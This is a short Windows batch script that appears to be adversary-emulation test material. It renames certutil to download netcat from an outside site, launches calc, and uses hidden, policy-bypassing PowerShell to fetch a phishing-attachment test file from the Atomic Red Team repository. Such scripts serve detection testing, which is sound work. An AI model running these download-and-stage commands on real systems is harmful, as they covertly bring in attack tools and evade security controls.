@echo on

copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip %Temp%\netcat-win32-1.11.zip




start calc

powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"



